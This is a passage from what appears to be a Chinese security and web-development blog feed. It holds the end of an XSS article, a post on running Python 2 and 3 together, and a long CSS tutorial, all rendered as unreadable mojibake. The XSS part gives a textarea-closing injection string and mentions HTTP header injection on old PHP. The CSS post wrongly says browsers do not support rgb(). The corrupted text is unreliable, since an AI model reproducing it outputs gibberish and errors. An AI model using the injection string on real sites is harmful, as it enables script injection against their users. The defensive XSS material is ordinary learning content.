0`<br>è¿™å°±æ˜¯ä¸€ä¸ªæ³¨å…¥ï¼Œåˆæ·»åŠ äº†ä¸€ä¸ªå“åº”å¤´ã€‚<br>ä½†æ˜¯è¿™ç§æ¼æ´åœ¨phpç‰ˆæœ¬&gt;5.1æ—¶å€™æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå…¶ä¸å…è®¸åœ¨HTTPå¤´ä¸­å‡ºç°ä¸¤ä¸ªå±æ€§ã€‚<br>åº”ç”¨åœºæ™¯ï¼š</p><ul><li>php&lt;5.1</li><li>ç¢°åˆ°äº†æœåŠ¡å™¨å¼€å¯xssæ‹¦æˆª</li></ul><h2 id="å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰"><a href="#å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰" class="headerlink" title="å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰"></a>å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰</h2><h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h3><p>ä¾‹å¦‚ &gt; &lt; Scriptç­‰ç­‰å­—çœ¼</p><h3 id="è½¬ä¹‰"><a href="#è½¬ä¹‰" class="headerlink" title="è½¬ä¹‰"></a>è½¬ä¹‰</h3><p>åˆ©ç”¨phpå‡½æ•° htmlentities()æŠŠå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</p><h2 id="ä¸ƒï¼šé—­åˆxss"><a href="#ä¸ƒï¼šé—­åˆxss" class="headerlink" title="ä¸ƒï¼šé—­åˆxss"></a>ä¸ƒï¼šé—­åˆxss</h2><p>å½“ä½ çš„jsä»£ç è¢«æµè§ˆå™¨ç›´æ¥æ˜¾ç¤ºå‡ºæ¥åï¼Œè€ƒè™‘æ˜¯å¦æ˜¯å…¶æºç é‡Œå¯¹ä½ çš„jsä»£ç åšäº†textareaæ ‡ç­¾å¤„ç†ï¼Œç„¶åå°±éœ€è¦æˆ‘ä»¬å»é—­åˆè¿™ä¸ªtextareaæ ‡ç­¾ï¼Œæ¯”è¾ƒé€šç”¨çš„å°±æ˜¯<code>&#39;&quot;&gt;&lt;/textarea&gt;</code>+jsä»£ç  å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜</title>
    <link href="/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
    <url>/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€æ˜“è§£å†³python2-Xä¸python3-xå…±å­˜é—®é¢˜"><a href="#ç®€æ˜“è§£å†³python2-Xä¸python3-xå…±å­˜é—®é¢˜" class="headerlink" title="ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜"></a>ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜</h1><p>python3.xä¸å…¼å®¹Python2.xï¼Œè¯­æ³•æœ‰è®¸å¤šä¸åŒï¼Œä½†å¾ˆå¤šå·¥å…·è¿˜æ˜¯éœ€è¦2.xç‰ˆæœ¬ï¼Œè‡ªå·±åˆæ˜¯åˆå­¦è€…ï¼Œåªæ˜¯è·‘è·‘åˆ«äººçš„è„šæœ¬ï¼Œä¸ä¼šæ”¹è¯­æ³•å†²çªã€‚ã€‚ã€‚ã€‚ä¸‹é¢è¯´è§£å†³åŠæ³•ã€‚</p><h2 id="å®‰è£…æ¨¡å—"><a href="#å®‰è£…æ¨¡å—" class="headerlink" title="å®‰è£…æ¨¡å—"></a>å®‰è£…æ¨¡å—</h2><p>Pythonç›®å‰è¿˜æ˜¯éœ€è¦åˆ†å¼€å®‰è£…</p><pre><code class="python">py -2 -m pip install xxxx</code></pre><pre><code class="python">py -3 -m pip install xxxx</code></pre><h2 id="è¿è¡Œè„šæœ¬"><a href="#è¿è¡Œè„šæœ¬" class="headerlink" title="è¿è¡Œè„šæœ¬"></a>è¿è¡Œè„šæœ¬</h2><p>åˆ†åˆ«ç”¨py2.x py3.xè¿è¡Œä¸€ä¸ª1.pyçš„è„šæœ¬ï¼š</p><pre><code class="python">py -2 1.py</code></pre><pre><code class="html">py -3 1.py</code></pre><p>æˆ–è€…åœ¨1.pyçš„æ–‡ä»¶ä»£ç å¤´åŠ ä¸Š<code>#! python3</code>  <code>#! python2</code>çœ‹ä¸ªäººçš„æƒ…å†µã€‚</p><p>è¿™æ ·å°±ç›´æ¥è¾“å…¥ï¼š</p><pre><code class="python">py 1.py</code></pre><p>è¿™åªæ˜¯è§£å†³äº†ç®€å•çš„<strong><u>å®‰è£…æ¨¡å—å’Œè¿è¡Œè„šæœ¬</u></strong>çš„é—®é¢˜ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csså­¦ä¹ </title>
    <link href="/2019/03/30/css%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/03/30/css%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="å¦‚ä½•ä½¿ç”¨CSS"><a href="#å¦‚ä½•ä½¿ç”¨CSS" class="headerlink" title="å¦‚ä½•ä½¿ç”¨CSS"></a>å¦‚ä½•ä½¿ç”¨CSS</h2><p>CSS<br>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ·»åŠ åˆ°HTMLä¸­:</p><ol><li>å†…è”æ ·å¼- åœ¨HTMLå…ƒç´ ä¸­ä½¿ç”¨â€styleâ€ <strong>å±æ€§ (ä¸æ¨èä½¿ç”¨)ï¼›</strong></li><li>å†…éƒ¨æ ·å¼è¡¨ -åœ¨HTMLæ–‡æ¡£å¤´éƒ¨ <code>&lt;head&gt;</code> åŒºåŸŸä½¿ç”¨<code>&lt;style&gt;</code><strong>å…ƒç´ </strong> æ¥åŒ…å«CSSã€‚</li><li>å¤–éƒ¨å¼•ç”¨ - ä½¿ç”¨å¤–éƒ¨ CSS <strong>æ–‡ä»¶</strong>(==æ¨èä½¿ç”¨)==</li></ol><h4 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h4><p>åº”ç”¨åˆ°ä¸ªåˆ«å…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…è”æ ·å¼ã€‚</p><pre><code class="html">&lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;è‹¹æœ&lt;/div&gt;</code></pre><h4 id="å†…éƒ¨æ ·å¼è¡¨"><a href="#å†…éƒ¨æ ·å¼è¡¨" class="headerlink" title="å†…éƒ¨æ ·å¼è¡¨"></a>å†…éƒ¨æ ·å¼è¡¨</h4><p>å½“å•ä¸ªæ–‡ä»¶éœ€è¦ç‰¹åˆ«æ ·å¼æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨<strong>å†…éƒ¨æ ·å¼è¡¨</strong>ã€‚ä½ å¯ä»¥åœ¨<code>&lt;head&gt;</code> éƒ¨åˆ†é€šè¿‡ <code>&lt;style&gt;</code>æ ‡ç­¾å®šä¹‰å†…éƒ¨æ ·å¼è¡¨:ã€‚ä¹Ÿæ¨èè¿™æ ·ä½¿ç”¨ä¾¿äºæ›´æ”¹å…¨å±€ã€‚</p><pre><code class="html">&lt;head&gt;&lt;style&gt;        div{            color: red;            width: 100px;             height: 100px;            background: yellow        }    &lt;/style&gt;&lt;/head&gt;</code></pre><p><strong>æ³¨ï¼šåœ¨å¤´æ–‡ä»¶å†™çš„æ—¶å€™ styleè¿˜æ˜¯ä¸ªå¼€é—­æ ‡ç­¾ã€‚</strong></p><h4 id="å¤–éƒ¨æ ·å¼è¡¨"><a href="#å¤–éƒ¨æ ·å¼è¡¨" class="headerlink" title="å¤–éƒ¨æ ·å¼è¡¨"></a>å¤–éƒ¨æ ·å¼è¡¨</h4><p>ç”¨<code>&lt;link&gt;</code>å½“æ ·å¼éœ€è¦è¢«åº”ç”¨åˆ°å¾ˆå¤šé¡µé¢çš„æ—¶å€™ï¼Œå¤–éƒ¨æ ·å¼è¡¨å°†æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚</p><pre><code class="html">&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;   &lt;/head&gt;</code></pre><p><strong>å…¶ä¸­â€œrel=â€stylesheetâ€ type=â€text/cssâ€â€è¿™æ˜¯å›ºå®šçš„,â€mystyle.cssâ€è¿™æ˜¯cssçš„åœ°å€ï¼›</strong></p><h4 id="ç»ƒä¹ ï¼š"><a href="#ç»ƒä¹ ï¼š" class="headerlink" title="ç»ƒä¹ ï¼š"></a><strong>ç»ƒä¹ ï¼š</strong></h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;cssä¸‰ç§å¼•å…¥æ–¹å¼&lt;/title&gt;    &lt;!-- &lt;style&gt;        div{            color: red;            width: 100px;             height: 100px;            background: yellow        }    &lt;/style&gt; --&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;1.css&quot;&gt;&lt;/head&gt;&lt;body&gt;      &lt;!-- &lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;è‹¹æœ&lt;/div&gt; --&gt;      &lt;div&gt; è‹¹æœ1&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code class="html">div{    color: red;    width: 100px;     height: 100px;    background: yellow    }   &lt;!-- 1.css --&gt;</code></pre><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css1.jpg?raw=true" srcset="/img/loading.gif" alt="CSS è¯­æ³•"></p><h2 id="CSS-è¯­æ³•"><a href="#CSS-è¯­æ³•" class="headerlink" title="CSS è¯­æ³•"></a>CSS è¯­æ³•</h2><h4 id="CSS-è¯­æ³•è§„åˆ™"><a href="#CSS-è¯­æ³•è§„åˆ™" class="headerlink" title="CSS è¯­æ³•è§„åˆ™"></a>CSS è¯­æ³•è§„åˆ™</h4><p>ç”±ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†æ„æˆï¼šé€‰æ‹©å™¨ï¼Œä»¥åŠä¸€æ¡æˆ–å¤šæ¡å£°æ˜:</p><ul><li>é€‰æ‹©å™¨é€šå¸¸æ˜¯æ‚¨éœ€è¦æ”¹å˜æ ·å¼çš„ HTML å…ƒç´ ã€‚</li><li>æ¯æ¡å£°æ˜ç”±ä¸€ä¸ªå±æ€§å’Œä¸€ä¸ªå€¼ç»„æˆã€‚</li><li>å±æ€§æ˜¯æ‚¨å¸Œæœ›è®¾ç½®çš„æ ·å¼å±æ€§ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€ä¸ªå€¼ã€‚å±æ€§å’Œå€¼è¢«å†’å·åˆ†å¼€ã€‚</li><li>CSSå£°æ˜æ€»æ˜¯ä»¥åˆ†å·(;)ç»“æŸï¼Œå£°æ˜ç»„ä»¥å¤§æ‹¬å·({})æ‹¬èµ·æ¥</li></ul><p>ä¾‹ï¼š<code>h1{ color:blue; font-size :12px;}</code></p><p>å…¶ä¸­h1 ä¸ºé€‰æ‹©å™¨ color æ˜¯å±æ€§ blueæ˜¯å€¼ã€‚</p><h4 id="CSS-æ³¨é‡Šï¼š"><a href="#CSS-æ³¨é‡Šï¼š" class="headerlink" title="CSS æ³¨é‡Šï¼š"></a><strong>CSS æ³¨é‡Š</strong>ï¼š</h4><p>CSSæ³¨é‡Šä»¥ â€œ<strong>/*</strong>â€œ å¼€å§‹, ä»¥ â€œ<strong>*/</strong>â€œ ç»“æŸã€‚</p><h4 id="é¢œè‰²ï¼š"><a href="#é¢œè‰²ï¼š" class="headerlink" title="é¢œè‰²ï¼š"></a>é¢œè‰²ï¼š</h4><p>é¢œè‰²å±æ€§è¢«ç”¨æ¥è®¾ç½®æ–‡å­—çš„é¢œè‰²ã€‚</p><p>é¢œè‰²æ˜¯é€šè¿‡CSSæœ€ç»å¸¸çš„æŒ‡å®šï¼š</p><ul><li>åå…­è¿›åˆ¶å€¼ - å¦‚: <strong>ï¼ƒFF0000</strong></li><li>ä¸€ä¸ªRGBå€¼ - å¦‚: <strong>RGB(255,0,0)</strong></li><li>é¢œè‰²çš„åç§° - å¦‚: <strong>red</strong></li></ul><p><strong>å¸¸ç”¨çš„</strong>ï¼š<strong>rgbï¼š</strong>ï¼šræ˜¯çº¢è‰²ï¼Œgæ˜¯ç»¿è‰²ï¼Œbæ˜¯è“è‰²ã€‚</p><pre><code class="html">body {color:red;}  h1 {color:#00ff00;}   /* å¯ä»¥å†™æˆ #0f0 */h2 {color:rgb(255,0,0);}   /* 0-255 */ æ˜¯å…¶é¢œè‰²æ·±æµ…</code></pre><p>==<strong>æ³¨</strong> - æ‰€æœ‰æµè§ˆå™¨éƒ½ä¸æ”¯æŒé¢œè‰²çš„rgbï¼ˆï¼‰å±æ€§ï¼Œå› æ­¤å»ºè®®ä¸è¦ä½¿ç”¨å®ƒã€‚==</p><h2 id="CSSé€‰æ‹©å™¨"><a href="#CSSé€‰æ‹©å™¨" class="headerlink" title="CSSé€‰æ‹©å™¨"></a>CSSé€‰æ‹©å™¨</h2><p><strong>åŸºæœ¬é€‰æ‹©å™¨</strong>ï¼š</p><ul><li><strong>id é€‰æ‹©å™¨</strong>ï¼šå¯ä»¥ä¸ºæ ‡æœ‰ç‰¹å®š id çš„ HTML å…ƒç´ æŒ‡å®šç‰¹å®šçš„æ ·å¼ã€‚HTMLå…ƒç´ ä»¥<strong>idå±æ€§</strong>æ¥è®¾ç½®idé€‰æ‹©å™¨,CSS ä¸­ id é€‰æ‹©å™¨ä»¥ <strong>â€œ#â€</strong> æ¥å®šä¹‰ã€‚ï¼ˆ==IDå±æ€§ä¸è¦ä»¥æ•°å­—å¼€å¤´==ï¼‰</li><li><strong>class é€‰æ‹©å™¨</strong>ï¼šclass é€‰æ‹©å™¨ç”¨äºæè¿°<strong>ä¸€ç»„å…ƒç´ çš„æ ·å¼</strong>ï¼Œclass é€‰æ‹©å™¨æœ‰åˆ«äºidé€‰æ‹©å™¨ï¼Œclasså¯ä»¥åœ¨å¤šä¸ªå…ƒç´ ä¸­ä½¿ç”¨ã€‚ ä¾‹ï¼š<code>&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt;</code>  ã€‚class é€‰æ‹©å™¨åœ¨HTMLä¸­ä»¥<strong>classå±æ€§</strong>è¡¨ç¤º, åœ¨ CSS ä¸­ï¼Œç±»é€‰æ‹©å™¨ä»¥ä¸€ä¸ªç‚¹<strong>â€œ.â€</strong>å·æ˜¾ç¤º</li><li><code>*</code>é€šé…ç¬¦ï¼šå…¨éƒ¨æ ‡ç­¾å±æ€§çš„éƒ½ä¼šæœ‰æ•ˆæœã€‚</li><li><strong>æ ‡ç­¾ div</strong>ï¼šdivæ ‡ç­¾ çš„ä¼šæœ‰æ•ˆæœã€‚</li></ul><p><strong>ç»ƒä¹ </strong>ï¼š</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;cssé€‰æ‹©å™¨&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;1.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;div111        &lt;div&gt;div222&lt;/div&gt;        &lt;p id=&quot;txt&quot;&gt;the way i am&lt;/p&gt;        &lt;p class=&quot;txt1 txt2&quot;&gt;song&lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>cssï¼š</p><pre><code class="html">div{    color: red;    width: 100px;     height: 100px;    background: yellow    }#txt{    color: #1f1;}.txt1 {    font-size: 10px;}.txt2 {    color: #ff2;}</code></pre><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css2.png?raw=true" srcset="/img/loading.gif" alt></p><h2 id="CSSåŸç†"><a href="#CSSåŸç†" class="headerlink" title="CSSåŸç†"></a>CSSåŸç†</h2><h4 id="ä¼˜å…ˆåŸåˆ™"><a href="#ä¼˜å…ˆåŸåˆ™" class="headerlink" title="ä¼˜å…ˆåŸåˆ™"></a>ä¼˜å…ˆåŸåˆ™</h4><p><strong>ä¼˜å…ˆåŸåˆ™</strong>ï¼šåè§£æçš„å†…å®¹ï¼Œä¼šè¦†ç›–æ‰åŸæ¥è§£æçš„å†…å®¹ã€‚</p><p><strong>1:åŒä¸€ä¸ªé€‰æ‹©å™¨</strong>:ä»ä¸Šå¾€ä¸‹æ‰§è¡Œã€‚</p><p>ä¾‹ï¼š</p><pre><code class="html">div{     color: red;    color: green;  }/*æœ€ç»ˆæ˜¯ä¸ºç»¿è‰²*/  </code></pre><p><strong>2:åŒä¸€ç±»å‹çš„é€‰æ‹©å™¨</strong>ï¼šä»ä¸Šå¾€ä¸‹æ‰§è¡Œ</p><p>ä¾‹ï¼š</p><pre><code class="html">div{    background: yellow;}div{    background: red;}/*æœ€ç»ˆæ˜¯ä¸ºçº¢è‰²*/  </code></pre><pre><code class="html">.bg1{    background: yellow;}.bg2{    background: blue;}/*æœ€ç»ˆæ˜¯ä¸ºè“è‰²*/</code></pre><p><code>&lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt;</code>  <strong>åœ¨HTMLä¸­ï¼Œbg1 ä¸bg2çš„ä½ç½®äº¤æ¢ä¹Ÿä¸ç®¡cssè§£æçš„äº‹æƒ…ï¼Œæ‰€ä»¥äº¤æ¢åè¿˜æ˜¯blue</strong>ã€‚</p><p><strong>3ï¼šä¸åŒç±»å‹çš„é€‰æ‹©å™¨ï¼š</strong>çœ‹ä¼˜å…ˆçº§</p><p>å…ˆè§£æä½çº§çš„åœ¨è§£æé«˜çº§çš„ï¼š<strong>* &lt; div &lt; class &lt; id</strong></p><pre><code class="html">div{    color: redï¼›}.bg1{    color: yellow;}   /*æœ€ç»ˆæ˜¯ä¸ºé»„è‰²*/</code></pre><p><strong>4ï¼šå¤šé‡æ ·å¼ä¼˜å…ˆçº§</strong></p><p>æ ·å¼å¯ä»¥è§„å®šåœ¨å•ä¸ªçš„ HTML å…ƒç´ ä¸­ï¼Œåœ¨ HTML é¡µçš„å¤´å…ƒç´ ä¸­ï¼Œæˆ–åœ¨ä¸€ä¸ªå¤–éƒ¨çš„ CSS æ–‡ä»¶ä¸­ã€‚ç”šè‡³å¯ä»¥åœ¨åŒä¸€ä¸ª HTML æ–‡æ¡£å†…éƒ¨å¼•ç”¨å¤šä¸ªå¤–éƒ¨æ ·å¼è¡¨ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><p><strong>å†…è”æ ·å¼ &gt; å†…éƒ¨æ ·å¼ &gt;å¤–éƒ¨æ ·å¼</strong>      ==ï¼ˆè°ä¼˜å…ˆçº§è¶Šé«˜è¶Šæœ€åè§£æï¼‰==</p><p>å¯¹äºå…¨éƒ¨éƒ½æ˜¯ å½“åŠ ä¸Š<code>!important</code>  è¿™ä¸ªé€‰æ‹©å™¨çš„å†…å®¹å°±ä¼šæœ€åè¿›è¡Œã€‚ </p><h4 id="ç»§æ‰¿åŸåˆ™"><a href="#ç»§æ‰¿åŸåˆ™" class="headerlink" title="ç»§æ‰¿åŸåˆ™"></a>ç»§æ‰¿åŸåˆ™</h4><p>==<strong>å¯¹äºåµŒå¥—æ ‡ç­¾ï¼Œå­çº§ç»§æ‰¿çˆ¶çº§ã€‚</strong>==</p><ol><li>æ–‡å­— æ–‡æœ¬ æ ·å¼å¯ä»¥ç»§æ‰¿ï¼Œå…¶ä»–çš„ä¸èƒ½ã€‚ </li><li>å—çº§å…ƒç´  æ²¡æœ‰è®¾ç½®çš„æ—¶å€™ï¼Œä¼šç»§æ‰¿çˆ¶çº§çš„<strong>å®½</strong>ï¼Œè€Œé«˜åº¦åˆ™æ˜¯çœ‹å…¶å†…å®¹é•¿çŸ­ã€‚</li></ol><h2 id="CSSç»„æˆé€‰æ‹©å™¨"><a href="#CSSç»„æˆé€‰æ‹©å™¨" class="headerlink" title="CSSç»„æˆé€‰æ‹©å™¨"></a>CSSç»„æˆé€‰æ‹©å™¨</h2><h4 id="åˆ†ç»„é€‰æ‹©å™¨"><a href="#åˆ†ç»„é€‰æ‹©å™¨" class="headerlink" title="åˆ†ç»„é€‰æ‹©å™¨"></a>åˆ†ç»„é€‰æ‹©å™¨</h4><p>ç›´æ¥ä¸Šä»£ç äº†ï¼š</p><pre><code class="html">div{    background: green;    color: red;}p{   background: green;    color: red;   font-size: 50px;}</code></pre><pre><code class="html">div,p{    background: green;    color: red;}p{   font-size: 50px;}</code></pre><p><strong>æŠŠdiv ä¸ p é‡Œé¢ç›¸åŒçš„éƒ¨åˆ†æ”¾åˆ°ä¸€ä¸ªé‡Œé¢å°±è¡Œäº†ã€‚</strong></p><h4 id="åµŒå¥—é€‰æ‹©å™¨"><a href="#åµŒå¥—é€‰æ‹©å™¨" class="headerlink" title="åµŒå¥—é€‰æ‹©å™¨"></a>åµŒå¥—é€‰æ‹©å™¨</h4><pre><code class="html">div p{    background: green;    color: red;    font-size: 50px;}    </code></pre><pre><code class="html">&lt;body&gt;    &lt;div&gt; div1        &lt;div&gt;div2            &lt;p&gt;p2&lt;/p&gt;            &lt;ul&gt;                &lt;li&gt;                    &lt;p&gt;p3&lt;/p&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;</code></pre><p><strong>åªè¦åœ¨å…¶çˆ¶æˆ–çˆ¶çš„ä»¥ä¸Šçº§æœ‰divï¼Œé‚£è¿™ä¸ªpé‡Œçš„ä¸œè¥¿å°±èƒ½ç”Ÿæ•ˆ</strong>ã€‚</p><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css3.jpg?raw=true" srcset="/img/loading.gif" alt></p><h4 id="å­é€‰æ‹©å™¨"><a href="#å­é€‰æ‹©å™¨" class="headerlink" title="å­é€‰æ‹©å™¨"></a>å­é€‰æ‹©å™¨</h4><p><strong>è¿™ä¸ªå’Œä»¥ä¸Šå¾ˆç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨åªåœ¨å…¶çˆ¶ä¸ºdivæ—¶ï¼Œæ‰èƒ½ç”Ÿæ•ˆã€‚</strong></p><pre><code class="html">div&gt;p{    background: green;    color: red;    font-size: 50px;}    </code></pre><p><strong>ç±»æ¯”ä»¥ä¸Šå°±æ˜¯åªæœ‰p2æœ‰cssæ•ˆæœ</strong></p><h4 id="åŒçº§é€‰æ‹©å™¨"><a href="#åŒçº§é€‰æ‹©å™¨" class="headerlink" title="åŒçº§é€‰æ‹©å™¨"></a>åŒçº§é€‰æ‹©å™¨</h4><pre><code class="html">div+p{    background: green;    color: red;    font-size: 50px;}    </code></pre><p>åœ¨å¹³çº§çš„pæ‰å¯ä»¥ç”Ÿæ•ˆï¼Œå¯¹æ¯”ä»¥ä¸Šï¼Œä¹Ÿå°±æ˜¯p1æ˜¯æœ‰cssæ•ˆæœã€‚</p><h2 id="å±æ€§é€‰æ‹©å™¨"><a href="#å±æ€§é€‰æ‹©å™¨" class="headerlink" title="å±æ€§é€‰æ‹©å™¨"></a>å±æ€§é€‰æ‹©å™¨</h2><pre><code class="html">p[title=cc]{    background: green;    color: red;    font-size: 50px;}</code></pre><pre><code class="html">&lt;body&gt;    &lt;div&gt; div1        &lt;div&gt;div2            &lt;p&gt;p2&lt;/p&gt;            &lt;ul&gt;                &lt;li&gt;                    &lt;p title=&quot;cc&quot;&gt;p3&lt;/p&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;p title=&quot;cc 1&quot;&gt;p1&lt;/p&gt;&lt;/body&gt;</code></pre><p>åŸºæœ¬æ ‡ç­¾==+==</p><ul><li><p>[å±æ€§=å€¼]ï¼šp3å‡ºç°cssæ•ˆæœã€‚</p></li><li><p>[å±æ€§~=å€¼]ï¼šp1 p3å‡ºç°cssæ•ˆæœã€‚  æ³¨æ„ï¼šä»£ç ä¸­<code>cc 1</code>éœ€è¦ç©ºæ ¼éš”å¼€ï¼Œä¸éš”æ²¡æœ‰æ•ˆæœã€‚</p></li><li><p>[å±æ€§^=å€¼]ï¼šå¼€å¤´æœ‰ccçš„å­—ç¬¦å°±è¡Œ<code>cc1</code>. p1 p3 å‡ºç°ccæ•ˆæœã€‚</p></li><li><p>[å±æ€§$=å€¼]ï¼šç±»æ¯”<code>^=</code>  æ˜¯ç»“æŸã€‚</p></li></ul><h2 id="ä¼ªå…ƒç´ é€‰æ‹©å™¨"><a href="#ä¼ªå…ƒç´ é€‰æ‹©å™¨" class="headerlink" title="ä¼ªå…ƒç´ é€‰æ‹©å™¨"></a>ä¼ªå…ƒç´ é€‰æ‹©å™¨</h2><p>æ¯ä¸ªæˆ‘è‡ªå·±å†™å‡ºæ¥çš„å…ƒç´ éƒ½ä¼šæœ‰ä¼ªå…ƒç´ ã€‚ã€</p><p>ä¾‹ï¼š</p><pre><code class="html">&lt;p title=&quot;cc&quot;&gt; &lt;!--&lt;before&gt; --&gt;        ppp  &lt;!--&lt;after&gt; --&gt;    &lt;/p&gt;</code></pre><p>ç›´æ¥ä¸Šä»£ç ï¼š</p><pre><code class="html">p::before{    content: &quot;before&quot;}p::after{    content: &quot;after&quot;}</code></pre><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css4.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><strong>å—å…ƒç´ ï¼š</strong></p><p>ç¬¬ä¸€ä¸ªå­—æ¯ï¼š<code>first-letter</code></p><p>ç¬¬ä¸€è¡Œï¼š<code>first-line</code></p><pre><code class="html">p::first-letter{    color: red;    font-size: 100px;}</code></pre><p>è¿™äº›å†™å°±æ˜¯ä¼šæ˜¯på†…å†…å®¹ç¬¬ä¸€ä¸ª<strong>å­—ç¬¦</strong>å¤§å†™ã€‚</p><p>ä¹Ÿå¯ä»¥ä¸º</p><pre><code class="html">&lt;p title=&quot;cc&quot;&gt;        &lt;first-letter&gt;t        &lt;/first-letter&gt;        he way i am ;    &lt;/p&gt;</code></pre><h2 id="CSS-èƒŒæ™¯"><a href="#CSS-èƒŒæ™¯" class="headerlink" title="CSS èƒŒæ™¯"></a>CSS èƒŒæ™¯</h2><p>CSS èƒŒæ™¯å±æ€§ç”¨äºå®šä¹‰HTMLå…ƒç´ çš„èƒŒæ™¯ã€‚</p><h4 id="èƒŒæ™¯é¢œè‰²"><a href="#èƒŒæ™¯é¢œè‰²" class="headerlink" title="èƒŒæ™¯é¢œè‰²"></a>èƒŒæ™¯é¢œè‰²</h4><p><code>background-color</code> å±æ€§å®šä¹‰äº†å…ƒç´ çš„èƒŒæ™¯é¢œè‰².</p><p>é¡µé¢çš„èƒŒæ™¯é¢œè‰²ä½¿ç”¨åœ¨bodyçš„é€‰æ‹©å™¨ä¸­:</p><p><code>body {background-color:red;}</code></p><h4 id="èƒŒæ™¯å›¾åƒ"><a href="#èƒŒæ™¯å›¾åƒ" class="headerlink" title="èƒŒæ™¯å›¾åƒ"></a>èƒŒæ™¯å›¾åƒ</h4><p><code>background-image</code>å±æ€§æè¿°äº†å…ƒç´ çš„èƒŒæ™¯å›¾åƒ.</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒèƒŒæ™¯å›¾åƒè¿›è¡Œ<strong>å¹³é“ºé‡å¤</strong>æ˜¾ç¤º.</p><p><code>body {background-image:url(&#39;1.png&#39;);}</code></p><h4 id="èƒŒæ™¯å›¾åƒ-ç›¸å…³è®¾ç½®"><a href="#èƒŒæ™¯å›¾åƒ-ç›¸å…³è®¾ç½®" class="headerlink" title="èƒŒæ™¯å›¾åƒ - ç›¸å…³è®¾ç½®"></a>èƒŒæ™¯å›¾åƒ - ç›¸å…³è®¾ç½®</h4><ul><li><strong>æ°´å¹³æˆ–å‚ç›´å¹³é“º</strong>ï¼š</li></ul><pre><code class="html">body{background-image:url(&#39;gradient2.png&#39;);background-repeat:repeat-x;}</code></pre><p>  é‡Œé¢repeat-xæ˜¯xè½´ï¼Œrepeat-yæ˜¯yè½´ã€‚</p><ul><li><strong>ä¸å¹³é“ºï¼š</strong><code>background-repeat:no-repeat</code></li><li><strong>å®šä½ï¼š</strong></li></ul><p>â€‹      <code>background-position:50% 0%</code> è¿™ä½¿å…¶åœ¨xè½´çš„ä¸­å¿ƒï¼Œ</p><p>â€‹        xï¼š left center rightï¼›</p><p>â€‹        y:  top center bottomï¼›</p><h2 id="csså­—ä½“"><a href="#csså­—ä½“" class="headerlink" title="csså­—ä½“"></a>csså­—ä½“</h2><h4 